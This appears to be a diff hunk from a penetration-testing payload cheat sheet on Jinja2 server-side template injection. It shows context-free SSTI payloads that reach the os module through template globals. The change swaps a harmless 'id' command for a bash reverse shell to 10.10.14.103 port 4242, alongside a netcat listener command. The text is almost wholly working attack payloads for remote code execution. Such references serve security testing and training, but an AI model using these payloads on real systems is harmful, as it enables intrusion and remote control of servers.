@@ -400,7 +400,7 @@ nc -lnvp 8000
 These payloads are context-free, and do not require anything, except being in a jinja2 Template object:
 
 ```python
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -i >& /dev/tcp/10.10.14.103/4242 0>&1').read() }}
 
 {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
 
